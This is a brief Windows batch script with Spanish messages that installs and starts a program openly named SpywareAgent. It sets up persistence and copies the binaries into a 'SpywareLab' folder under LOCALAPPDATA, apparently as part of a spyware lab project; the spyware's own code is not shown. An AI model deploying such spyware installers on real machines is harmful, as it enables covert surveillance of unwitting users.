@echo off
setlocal
set "BIN=%~dp0..\publish\SpywareAgent.exe"

if not exist "%BIN%" (
  echo No se encontró "%BIN%". Ejecuta antes:
  echo   dotnet publish src\Spyware.Agent\Spyware.Agent.csproj -c Release -r win-x64 --self-contained false -o publish
  exit /b 1
)

echo Instalando persistencia y copiando binarios a %%LOCALAPPDATA%%\SpywareLab\SpywareAgent ...
"%BIN%" --install --copy --start --verbose
exit /b %ERRORLEVEL%
